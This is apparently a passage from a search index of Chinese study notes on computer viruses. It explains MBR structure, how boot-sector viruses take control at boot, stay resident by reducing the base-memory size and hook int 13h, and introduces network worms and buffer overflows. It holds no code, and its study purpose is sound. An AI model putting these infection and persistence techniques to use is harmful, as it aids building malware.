1023 63 512/1048576=8024MB\uff081M=1048576 Bytes\uff09 \u6216\u786c\u76d8\u5382\u5546\u5e38\u7528\u7684\u5355\u4f4d\uff1a255 1023 63 512/1000000=8414MB\uff081M=1000000 Bytes\uff09 \u786c\u76d8\u7684\u6570\u636e\u5b58\u50a8\u7ed3\u6784 # \u786c\u76d8\u7531\u5f88\u591a\u76d8\u7247(platter)\u7ec4\u6210\uff0c\u6bcf\u4e2a\u76d8\u7247\u7684\u6bcf\u4e2a\u2faf\u90fd\u6709\u2f00\u4e2a\u8bfb\u5199\u78c1\u5934\u3002\u5982\u679c\u6709N\u4e2a\u76d8\u7247\u3002\u5c31\u6709 2N\u4e2a\u2faf\uff0c\u5bf9\u5e942N\u4e2a\u78c1\u5934(Heads)\uff0c\u4ece0\u30011\u30012\u5f00\u59cb\u7f16\u53f7\u3002 \u6bcf\u4e2a\u76d8\u7247\u88ab\u5212\u5206\u6210\u82e5\u5e72\u4e2a\u540c\u5fc3\u5706\u78c1\u9053(\u903b\u8f91\u4e0a\u7684\uff0c\u662f\u4e0d\u53ef\u89c1\u7684)\uff0c\u6bcf\u4e2a\u76d8\u7247\u7684\u5212\u5206\u89c4\u5219\u901a\u5e38\u662f\u4e00\u6837\u7684\u3002\u8fd9\u6837\u6bcf\u4e2a\u76d8\u7247\u7684\u534a\u5f84\u5747\u4e3a\u56fa\u5b9a\u503cR\u7684\u540c\u5fc3\u5706\u518d\u903b\u8f91\u4e0a\u5f62\u6210\u4e86\u2f00\u4e2a\u4ee5\u7535\u673a\u4e3b\u8f74\u4e3a\u8f74\u7684\u67f1\u9762 (Cylinders)\uff0c\u4ece\u5916\u81f3\u91cc\u7f16\u53f7\u4e3a0\u30011\u30012\u2026\u2026 \u6bcf\u4e2a\u76d8\u7247\u4e0a\u7684\u6bcf\u4e2a\u78c1\u9053\u2f1c\u88ab\u5212\u5206\u4e3a\u51e0\u5341\u4e2a\u6247\u533a(Sector)\uff0c\u901a\u5e38\u7684\u5bb9\u91cf\u662f512byte\uff0c\u5e76\u6309\u7167\u2f00\u5b9a\u89c4\u5219\u7f16\u53f7\u4e3a1\u30012\u30013\u2026\u2026 \u5f62\u6210Cylinders\u00d7Heads\u00d7Sector\u4e2a\u6247\u533a\u3002 \u4e3b\u5f15\u5bfc\u6247\u533a # \u89e3\u91ca # \u4e3b\u5f15\u5bfc\u8bb0\u5f55\uff08Master Boot Record\uff0cMBR\uff09\uff08446\u5b57\u8282\uff09 \u4e3b\u5f15\u5bfc\u7a0b\u5e8f\uff08\u4f4d\u79fb\u91cf000~1BDH\uff09\uff0c\u7528\u4e8e\u786c\u76d8\u542f\u52a8\u65f6\u5c06\u7cfb\u7edf\u63a7\u5236\u8f6c\u7ed9\u7528\u6237\u6307\u5b9a\u7684\u5e76\u5728\u5206\u533a\u4e2d\u767b\u8bb0\u4e86\u7684\u67d0\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u533a\u3002 \u4e3b\u5206\u533a\u8868\uff08\u78c1\u76d8\u5206\u533a\u8868\uff09\uff084\u4e2a\u5206\u533a\u8868\u9879\uff0c\u6bcf\u4e2a16\u5b57\u8282\uff09\uff08Partition Table\uff0c\u4f4d\u79fb\u91cf1BE-1FDH\uff09\uff0c\u7528\u4e8e\u6307\u660e\u786c\u76d8\u5212\u5206\u60c5\u51b5\uff0c\u542b4\u4e2a\u53ef\u80fd\u7684\u5206\u533a\uff0c\u6bcf\u4e2a\u5206\u533a\u7684\u8bb0\u5f55\u5360\u752816\u4e2a\u5b57\u8282\uff0c\u7531FDISK\u7a0b\u5e8f\u5efa\u7acb\u3002 \u5f15\u5bfc\u6247\u533a\u6807\u8bb0\uff08Boot Record ID/Signature\uff09\uff082\u5b57\u8282\uff09 01FE\uff1a55 01FF\uff1aAA \u4e3b\u5f15\u5bfc\u8bb0\u5f55\u5305\u542b\u5185\u5bb9 # \u786c\u76d8\u7684\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u6247\u533a\uff0c\u53730\u2faf0\u67f11\u6247\u533a\uff0c\u662f\u2f00\u4e2a\u7cfb\u7edf\u7684\u9690\u542b\u6247\u533a\u3002 \u2460\u4e3b\u5f15\u5bfc\u7a0b\u5e8f\u4ee3\u7801 \u4e3b\u5f15\u5bfc\u7a0b\u5e8f\u2f64\u6765\u627e\u51fa\u7cfb\u7edf\u5f53\u524d\u7684\u6d3b\u52a8\u5206\u533a\uff0c\u8d1f\u8d23\u628a\u5bf9\u5e94\u7684\u2f00\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u5f15\u5bfc\u8bb0\u5f55(\u5f53\u524d\u6d3b\u52a8\u5206\u533a\u7684\u5f15\u5bfc\u8bb0\u5f55)\u88c5\u5165\u5185\u5b58\uff0c\u7136\u540e\u628a\u63a7\u5236\u6743\u8f6c\u7ed9\u8be5\u5206\u533a\u7684\u5f15\u5bfc\u8bb0\u5f55\u3002 \u2461\u5206\u533a\u8868 \u4e3b\u5f15\u5bfc\u6247\u533a\u7684\u5206\u533a\u8868\u5b58\u653e\u5728\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u7684\u540e\u534a\u90e8\u5206\u3002\u5206\u533a\u8868\u53ef\u5206\u4e3a4\u4e2a\u90e8\u5206(DOS3.2\u4ee5\u4e0b\u7248\u672c) \u8868\u793a4\u4e2a\u5206\u533a\u7684\u4fe1\u606f\u3002\u4ece\u4f4d\u79fb\u91cf1BEH\u5f00\u59cb\u768464\u4e2a\u5b57\u8282\u662f\u786c\u76d8\u5206\u533a\u8868 \u2462\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u7ed3\u675f\u6807\u5fd7 \u5f53\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u7ed3\u675f\u6807\u5fd7\u4e3aAA55H\u65f6\uff0c\u8868\u793a\u8be5\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u662f\u2f00\u2f00\u4e2a\u6709\u6548\u7684\u8bb0\u5f55\uff0c\u5b83\u53ef\u2f64\u6765\u5f15\u5bfc \u786c\u76d8\u7cfb\u7edf\u3002 \u6280\u672f\u65b9\u6cd5 # \u63d0\u9192\u6ce8\u610f\uff1a\u542f\u52a8\u8fc7\u7a0b\u4e2d\uff0c\u6709\u4e00\u5173\u952e\u7ec6\u8282\uff1aROM BIOS\u5728\u8bfb\u5f15\u5bfc\u6247\u533a\u81f3\u5185\u5b580000\uff1a7C00\u5904\u6267\u884c\u65f6\uff0c\u5bf9\u5f15\u5bfc\u6247\u533a\u7684\u5408\u6cd5\u6027\u5e76\u672a\u505a\u68c0\u67e5\uff0c\u800c\u662f\u7b80\u5355\u7684\u3001\u673a\u68b0\u7684\u8bfb\u5165\u6267\u884c\u3002 \u5f15\u5bfc\u578b\u75c5\u6bd2\u5c31\u5229\u7528\u4e86DOS\u542f\u52a8\u7684\u8fd9\u4e00\u5f31\u70b9\uff0c\u4f7f\u75c5\u6bd2\u7a0b\u5e8f\u5148\u4e8e\u6b63\u5e38\u7684DOS\u5f15\u5bfc\u7a0b\u5e8f\u83b7\u5f97\u63a7\u5236\u3002 \u5e38\u9a7b\u5185\u5b58\u9ad8\u7aef # \u2f6c\u7684\uff1a\u60f3\u529e\u6cd5\u628a\u75c5\u6bd2\u7a0b\u5e8f\u8f7d\u2f0a\u5230\u5185\u5b58\u4e2d\uff0c\u8f7d\u2f0a\u540e\u4fdd\u8bc1\u8fd9\u2f00\u6bb5\u4ee3\u7801\u4e0d\u88ab\u5176\u4ed6\u4ee3\u7801\u8986\u76d6\u3002 \u5185\u5b580000:0413\u5904\u4e24\u5b57\u8282\u63cf\u8ff0\u4e86\u57fa\u672c\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u5b83\u7684\u503c\u662fKB\u7684\u500d\u6570\u3002 \u75c5\u6bd2\u7a0b\u5e8f\u9996\u5148\u5c06\u81ea\u8eab\u590d\u5236\u5230\u5185\u5b58\u7684\u9ad8\u7aef\uff0c\u4fee\u6539\u5185\u5b58\u5bb9\u91cf\u6807\u5fd7\u5355\u5143\uff0c\u5728\u539f\u6709\u503c\u7684\u57fa\u7840\u4e0a\u51cf\u53bb\u75c5\u6bd2\u957f\u5ea6\uff0c\u4f7f\u5f97\u75c5\u6bd2\u4ee3\u7801\u80fd\u591f\u5e38\u9a7b\u5185\u5b58\uff1b \u7136\u540e\u5c06\u539fint 13h\u78c1\u76d8\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u7684\u4e2d\u65ad\u5411\u91cf\u4fdd\u5b58\uff0c\u5e76\u4fee\u6539\u6b64\u4e2d\u65ad\u5411\u91cf\uff0c\u5c06\u5176\u6307\u5411\u75c5\u6bd2\u4ee3\u7801\uff0c\u75c5\u6bd2\u4ee3\u7801\u56e0\u6b64\u83b7\u5f97\u7cfb\u7edf\u63a7\u5236\u6743\uff0c\u8fdb\u800c\u6267\u884c\u611f\u67d3\u3001\u7834\u574f\u7b49\u5de5\u4f5c\u3002 \u4fee\u6539\u4e2d\u65ad\u5411\u91cf\u8868\uff0c\u622a\u83b7\u7cfb\u7edf\u4e2d\u65ad #","title":"\u7b2c4\u7ae0 \u5f15\u5bfc\u578b\u75c5\u6bd2\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u7b2c4\u7ae0-\u5f15\u5bfc\u578b\u75c5\u6bd2\u5206\u6790","text":"","title":"\u7b2c4\u7ae0 \u5f15\u5bfc\u578b\u75c5\u6bd2\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u786c\u76d8\u7269\u7406\u7ed3\u6784","text":"\u73b0\u5728\u7684\u786c\u76d8\u4e3b\u8981\u5305\u62ec\uff1a\u76d8\u7247\u3001\u78c1\u5934\u3001\u76d8\u4e3b\u8f74\u3001\u63a7\u5236\u7535\u673a\u3001\u78c1\u5934\u63a7\u5236\u5668\u3001\u6570\u636e\u8f6c\u6362\u5668\u3001\u63a5\u53e3\u3001\u7f13\u5b58\u7b49\u51e0\u4e2a\u90e8\u4efd\u3002 \u786c\u76d8\u4e0a\u6240\u6709\u7684\u76d8\u7247\u90fd\u56fa\u5b9a\u5728\u2f00\u4e2a\u65cb\u8f6c\u8f74\u4e0a\uff0c\u8fd9\u4e2a\u8f74\u5373\u76d8\u7247\u4e3b\u8f74\u3002\u5176\u4e2d\u6240\u6709\u76d8\u7247\u4e4b\u95f4\u662f\u7edd\u5bf9\u5e73\u884c\u7684\uff0c\u5728\u6bcf\u4e2a\u76d8\u7247\u7684\u5b58\u50a8\u2faf\u4e0a\u90fd\u6709\u2f00\u4e2a\u78c1\u5934\uff0c\u78c1\u5934\u4e0e\u76d8\u7247\u4e4b\u95f4\u7684\u8ddd\u79bb\u6bd4\u5934\u53d1\u4e1d\u7684\u76f4\u5f84\u8fd8\u8981\u5c0f\u3002 \u6240\u6709\u7684\u78c1\u5934\u90fd\u8fde\u5728\u2f00\u4e2a\u78c1\u5934\u63a7\u5236\u5668\u4e0a\uff0c\u7531\u78c1\u5934\u63a7\u5236\u5668\u8d1f\u8d23\u5404\u4e2a\u78c1\u5934\u7684\u8fd0\u52a8\u3002","title":"\u786c\u76d8\u7269\u7406\u7ed3\u6784"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u786c\u76d8\u53c2\u6570","text":"CHS\uff08Cylinder/Head/Sector\uff09\u53c2\u6570 \u78c1\u5934\u6570\uff08Heads\uff09\u8868\u793a\u786c\u76d8\u603b\u5171\u6709\u51e0\u4e2a\u78c1\u5934\uff0c\u4e5f\u5c31\u662f\u6709\u51e0\u9762\u76d8\u7247\uff0c\u6700\u5927\u4e3a255\uff08\u75288\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u5b58\u50a8\uff09 \u67f1\u9762\u6570\uff08Cylinders\uff09\u8868\u793a\u786c\u76d8\u6bcf\u4e00\u9762\u76d8\u7247\u4e0a\u6709\u51e0\u6761\u78c1\u9053\uff0c\u6700\u5927\u4e3a1023\uff08\u752810\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u5b58\u50a8\uff09\uff1b\u6247\u533a\u6570\uff08Sectors\uff09\u8868\u793a\u6bcf\u4e00\u6761\u78c1\u9053\u4e0a\u6709\u51e0\u4e2a\u6247\u533a\uff0c\u6700\u5927\u4e3a63\uff08\u75286\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u5b58\u50a8\uff09\uff0c\u6bcf\u4e2a\u6247\u533a\u4e00\u822c\u662f512\u4e2a\u5b57\u8282 \u78c1\u76d8\u6700\u5927\u5bb9\u91cf 255 1023 63 512/1048576=8024MB\uff081M=1048576 Bytes\uff09 \u6216\u786c\u76d8\u5382\u5546\u5e38\u7528\u7684\u5355\u4f4d\uff1a255 1023 63 512/1000000=8414MB\uff081M=1000000 Bytes\uff09","title":"\u786c\u76d8\u53c2\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u786c\u76d8\u7684\u6570\u636e\u5b58\u50a8\u7ed3\u6784","text":"\u786c\u76d8\u7531\u5f88\u591a\u76d8\u7247(platter)\u7ec4\u6210\uff0c\u6bcf\u4e2a\u76d8\u7247\u7684\u6bcf\u4e2a\u2faf\u90fd\u6709\u2f00\u4e2a\u8bfb\u5199\u78c1\u5934\u3002\u5982\u679c\u6709N\u4e2a\u76d8\u7247\u3002\u5c31\u6709 2N\u4e2a\u2faf\uff0c\u5bf9\u5e942N\u4e2a\u78c1\u5934(Heads)\uff0c\u4ece0\u30011\u30012\u5f00\u59cb\u7f16\u53f7\u3002 \u6bcf\u4e2a\u76d8\u7247\u88ab\u5212\u5206\u6210\u82e5\u5e72\u4e2a\u540c\u5fc3\u5706\u78c1\u9053(\u903b\u8f91\u4e0a\u7684\uff0c\u662f\u4e0d\u53ef\u89c1\u7684)\uff0c\u6bcf\u4e2a\u76d8\u7247\u7684\u5212\u5206\u89c4\u5219\u901a\u5e38\u662f\u4e00\u6837\u7684\u3002\u8fd9\u6837\u6bcf\u4e2a\u76d8\u7247\u7684\u534a\u5f84\u5747\u4e3a\u56fa\u5b9a\u503cR\u7684\u540c\u5fc3\u5706\u518d\u903b\u8f91\u4e0a\u5f62\u6210\u4e86\u2f00\u4e2a\u4ee5\u7535\u673a\u4e3b\u8f74\u4e3a\u8f74\u7684\u67f1\u9762 (Cylinders)\uff0c\u4ece\u5916\u81f3\u91cc\u7f16\u53f7\u4e3a0\u30011\u30012\u2026\u2026 \u6bcf\u4e2a\u76d8\u7247\u4e0a\u7684\u6bcf\u4e2a\u78c1\u9053\u2f1c\u88ab\u5212\u5206\u4e3a\u51e0\u5341\u4e2a\u6247\u533a(Sector)\uff0c\u901a\u5e38\u7684\u5bb9\u91cf\u662f512byte\uff0c\u5e76\u6309\u7167\u2f00\u5b9a\u89c4\u5219\u7f16\u53f7\u4e3a1\u30012\u30013\u2026\u2026 \u5f62\u6210Cylinders\u00d7Heads\u00d7Sector\u4e2a\u6247\u533a\u3002","title":"\u786c\u76d8\u7684\u6570\u636e\u5b58\u50a8\u7ed3\u6784"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u4e3b\u5f15\u5bfc\u6247\u533a","text":"","title":"\u4e3b\u5f15\u5bfc\u6247\u533a"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u89e3\u91ca","text":"\u4e3b\u5f15\u5bfc\u8bb0\u5f55\uff08Master Boot Record\uff0cMBR\uff09\uff08446\u5b57\u8282\uff09 \u4e3b\u5f15\u5bfc\u7a0b\u5e8f\uff08\u4f4d\u79fb\u91cf000~1BDH\uff09\uff0c\u7528\u4e8e\u786c\u76d8\u542f\u52a8\u65f6\u5c06\u7cfb\u7edf\u63a7\u5236\u8f6c\u7ed9\u7528\u6237\u6307\u5b9a\u7684\u5e76\u5728\u5206\u533a\u4e2d\u767b\u8bb0\u4e86\u7684\u67d0\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u533a\u3002 \u4e3b\u5206\u533a\u8868\uff08\u78c1\u76d8\u5206\u533a\u8868\uff09\uff084\u4e2a\u5206\u533a\u8868\u9879\uff0c\u6bcf\u4e2a16\u5b57\u8282\uff09\uff08Partition Table\uff0c\u4f4d\u79fb\u91cf1BE-1FDH\uff09\uff0c\u7528\u4e8e\u6307\u660e\u786c\u76d8\u5212\u5206\u60c5\u51b5\uff0c\u542b4\u4e2a\u53ef\u80fd\u7684\u5206\u533a\uff0c\u6bcf\u4e2a\u5206\u533a\u7684\u8bb0\u5f55\u5360\u752816\u4e2a\u5b57\u8282\uff0c\u7531FDISK\u7a0b\u5e8f\u5efa\u7acb\u3002 \u5f15\u5bfc\u6247\u533a\u6807\u8bb0\uff08Boot Record ID/Signature\uff09\uff082\u5b57\u8282\uff09 01FE\uff1a55 01FF\uff1aAA","title":"\u89e3\u91ca"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u5305\u542b\u5185\u5bb9","text":"\u786c\u76d8\u7684\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u6247\u533a\uff0c\u53730\u2faf0\u67f11\u6247\u533a\uff0c\u662f\u2f00\u4e2a\u7cfb\u7edf\u7684\u9690\u542b\u6247\u533a\u3002 \u2460\u4e3b\u5f15\u5bfc\u7a0b\u5e8f\u4ee3\u7801 \u4e3b\u5f15\u5bfc\u7a0b\u5e8f\u2f64\u6765\u627e\u51fa\u7cfb\u7edf\u5f53\u524d\u7684\u6d3b\u52a8\u5206\u533a\uff0c\u8d1f\u8d23\u628a\u5bf9\u5e94\u7684\u2f00\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u5f15\u5bfc\u8bb0\u5f55(\u5f53\u524d\u6d3b\u52a8\u5206\u533a\u7684\u5f15\u5bfc\u8bb0\u5f55)\u88c5\u5165\u5185\u5b58\uff0c\u7136\u540e\u628a\u63a7\u5236\u6743\u8f6c\u7ed9\u8be5\u5206\u533a\u7684\u5f15\u5bfc\u8bb0\u5f55\u3002 \u2461\u5206\u533a\u8868 \u4e3b\u5f15\u5bfc\u6247\u533a\u7684\u5206\u533a\u8868\u5b58\u653e\u5728\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u7684\u540e\u534a\u90e8\u5206\u3002\u5206\u533a\u8868\u53ef\u5206\u4e3a4\u4e2a\u90e8\u5206(DOS3.2\u4ee5\u4e0b\u7248\u672c) \u8868\u793a4\u4e2a\u5206\u533a\u7684\u4fe1\u606f\u3002\u4ece\u4f4d\u79fb\u91cf1BEH\u5f00\u59cb\u768464\u4e2a\u5b57\u8282\u662f\u786c\u76d8\u5206\u533a\u8868 \u2462\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u7ed3\u675f\u6807\u5fd7 \u5f53\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u7ed3\u675f\u6807\u5fd7\u4e3aAA55H\u65f6\uff0c\u8868\u793a\u8be5\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u662f\u2f00\u2f00\u4e2a\u6709\u6548\u7684\u8bb0\u5f55\uff0c\u5b83\u53ef\u2f64\u6765\u5f15\u5bfc \u786c\u76d8\u7cfb\u7edf\u3002","title":"\u4e3b\u5f15\u5bfc\u8bb0\u5f55\u5305\u542b\u5185\u5bb9"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u6280\u672f\u65b9\u6cd5","text":"\u63d0\u9192\u6ce8\u610f\uff1a\u542f\u52a8\u8fc7\u7a0b\u4e2d\uff0c\u6709\u4e00\u5173\u952e\u7ec6\u8282\uff1aROM BIOS\u5728\u8bfb\u5f15\u5bfc\u6247\u533a\u81f3\u5185\u5b580000\uff1a7C00\u5904\u6267\u884c\u65f6\uff0c\u5bf9\u5f15\u5bfc\u6247\u533a\u7684\u5408\u6cd5\u6027\u5e76\u672a\u505a\u68c0\u67e5\uff0c\u800c\u662f\u7b80\u5355\u7684\u3001\u673a\u68b0\u7684\u8bfb\u5165\u6267\u884c\u3002 \u5f15\u5bfc\u578b\u75c5\u6bd2\u5c31\u5229\u7528\u4e86DOS\u542f\u52a8\u7684\u8fd9\u4e00\u5f31\u70b9\uff0c\u4f7f\u75c5\u6bd2\u7a0b\u5e8f\u5148\u4e8e\u6b63\u5e38\u7684DOS\u5f15\u5bfc\u7a0b\u5e8f\u83b7\u5f97\u63a7\u5236\u3002","title":"\u6280\u672f\u65b9\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u5e38\u9a7b\u5185\u5b58\u9ad8\u7aef","text":"\u2f6c\u7684\uff1a\u60f3\u529e\u6cd5\u628a\u75c5\u6bd2\u7a0b\u5e8f\u8f7d\u2f0a\u5230\u5185\u5b58\u4e2d\uff0c\u8f7d\u2f0a\u540e\u4fdd\u8bc1\u8fd9\u2f00\u6bb5\u4ee3\u7801\u4e0d\u88ab\u5176\u4ed6\u4ee3\u7801\u8986\u76d6\u3002 \u5185\u5b580000:0413\u5904\u4e24\u5b57\u8282\u63cf\u8ff0\u4e86\u57fa\u672c\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u5b83\u7684\u503c\u662fKB\u7684\u500d\u6570\u3002 \u75c5\u6bd2\u7a0b\u5e8f\u9996\u5148\u5c06\u81ea\u8eab\u590d\u5236\u5230\u5185\u5b58\u7684\u9ad8\u7aef\uff0c\u4fee\u6539\u5185\u5b58\u5bb9\u91cf\u6807\u5fd7\u5355\u5143\uff0c\u5728\u539f\u6709\u503c\u7684\u57fa\u7840\u4e0a\u51cf\u53bb\u75c5\u6bd2\u957f\u5ea6\uff0c\u4f7f\u5f97\u75c5\u6bd2\u4ee3\u7801\u80fd\u591f\u5e38\u9a7b\u5185\u5b58\uff1b \u7136\u540e\u5c06\u539fint 13h\u78c1\u76d8\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u7684\u4e2d\u65ad\u5411\u91cf\u4fdd\u5b58\uff0c\u5e76\u4fee\u6539\u6b64\u4e2d\u65ad\u5411\u91cf\uff0c\u5c06\u5176\u6307\u5411\u75c5\u6bd2\u4ee3\u7801\uff0c\u75c5\u6bd2\u4ee3\u7801\u56e0\u6b64\u83b7\u5f97\u7cfb\u7edf\u63a7\u5236\u6743\uff0c\u8fdb\u800c\u6267\u884c\u611f\u67d3\u3001\u7834\u574f\u7b49\u5de5\u4f5c\u3002","title":"\u5e38\u9a7b\u5185\u5b58\u9ad8\u7aef"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/#\u4fee\u6539\u4e2d\u65ad\u5411\u91cf\u8868\u622a\u83b7\u7cfb\u7edf\u4e2d\u65ad","text":"","title":"\u4fee\u6539\u4e2d\u65ad\u5411\u91cf\u8868\uff0c\u622a\u83b7\u7cfb\u7edf\u4e2d\u65ad"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/","text":"\u7f51\u7edc\u8815\u866b\u75c5\u6bd2 # \u8815\u866b\u75c5\u6bd2\u7684\u57fa\u672c\u7279\u5f81 # \u53ef\u4ee5\u4ece\u4e00\u53f0\u8ba1\u7b97\u673a\u79fb\u52a8\u5230\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a \u53ef\u4ee5\u81ea\u6211\u590d\u5236 \u8815\u866b\u7684\u7279\u6027 # \u4f20\u64ad\u6027 \u5bc4\u751f\u6027 \u4e0d\u5bc4\u751f\u4e8e\u6587\u4ef6\u6216\u5f15\u5bfc\u6247\u533a\uff0c\u4e00\u822c\u4ee5\u72ec\u7acb\u7684\u6587\u4ef6\u6216\u8005\u591a\u4e2a\u6587\u4ef6\u5b58\u5728\u4e8e\u78c1\u76d8\uff0c\u4ee5\u72ec\u7acb\u7684\u8fdb\u7a0b\u8fd0\u884c\u4e8e\u5185\u5b58\u6216\u8005\u5bc4\u751f\u5728\u5176\u4ed6\u8fdb\u7a0b\u4e2d \u8815\u866b\u653b\u51fb\u5bf9\u8c61 # \u9488\u5bf9\u4f01\u4e1a\u7528\u6237\u548c\u5c40\u57df\u7f51\uff08\u7cfb\u7edf\u6f0f\u6d1e\u4e3b\u52a8\u653b\u51fb\uff09 \u4e2a\u4eba\u7528\u6237\uff08email\uff09 \u8815\u866b\u7684\u7279\u70b9 # \u5229\u7528\u64cd\u4f5c\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u4e3b\u52a8\u8fdb\u884c\u653b\u51fb \u4f20\u64ad\u65b9\u5f0f\u591a\u6837\u5316 \u75c5\u6bd2\u5236\u4f5c\u6280\u672f\u4e0e\u9ed1\u5ba2\u6280\u672f\u76f8\u7ed3\u5408\uff0c\u6f5c\u5728\u7684\u5a01\u80c1\u548c\u635f\u5931\u66f4\u5927 \u8815\u866b\u7684\u653b\u51fb\u624b\u6bb5 # \u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb-\u5806\u6808\u3001\u5806 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb \u62d2\u7edd\u670d\u52a1\u653b\u51fb \u5f31\u53e3\u4ee4\u653b\u51fb \u9ed8\u8ba4\u8bbe\u7f6e\u8106\u5f31\u6027\u653b\u51fb \u8815\u866b\u548c\u75c5\u6bd2\u7684\u533a\u522b # \u8ba1\u7b97\u673a\u75c5\u6bd2\u4e0e\u8815\u866b\u7684\u4e00\u4e2a\u91cd\u8981\u533a\u522b\u662f\uff0c\u75c5\u6bd2\u9700\u8981\u501f\u52a9\u6d3b\u52a8\u7684\u5bbf\u4e3b\u7a0b\u5e8f\u6216\u5df2\u88ab\u611f\u67d3\u7684\u6d3b\u52a8\u64cd\u4f5c\u7cfb\u7edf\u624d\u80fd\u8fd0\u884c\u3001\u9020\u6210\u7834\u574f\u5e76\u611f\u67d3\u5176\u4ed6\u53ef\u6267\u884c\u6587\u4ef6\u6216\u6587\u6863\uff1b\u800c\u8815\u866b\u662f\u72ec\u7acb\u7684\u6076\u610f\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97\u673a\u7f51\u7edc\u8fdb\u884c\u81ea\u6211\u590d\u5236\u548c\u4f20\u64ad\uff0c\u4e0d\u9700\u8981\u4eba\u5de5\u5e72\u9884\u3002 \u7f13\u51b2\u533a\u6ea2\u51fa # \u6240\u8c13\u7f13\u51b2\u533a\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u7a0b\u5e8f\u8fd0\u884c\u65f6\u5185\u5b58\u4e2d\u7684\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u3002 \u4f8b\u5982C\u8bed\u8a00\u4e2d\u7ecf\u5e38\u8981\u7528\u5230\u7684\u6570\u7ec4\uff0c\u5176\u4e2d\u6700\u5e38\u89c1\u7684\u662f\u5b57\u7b26\u6570\u7ec4\u3002 \u5982\u679c\u5411\u4e00\u4e2a\u7f13\u51b2\u533a\u590d\u5236\u6570\u636e\uff0c\u4f46\u662f\u590d\u5236\u7684\u6570\u636e\u91cf\u6bd4\u7f13\u51b2\u533a\u5927\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u53d1\u751f\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u4ea7\u751f\u7684\u6839\u6e90 # \u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u5bf9\u4ee3\u7801\u548c\u6570\u636e\u91c7\u7528\u7edf\u4e00\u7f16\u5740\uff0c\u6ca1\u6709\u4e25\u683c\u533a\u5206\u4e8c\u8005\u3002\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u89c4\u5b9a\uff1a 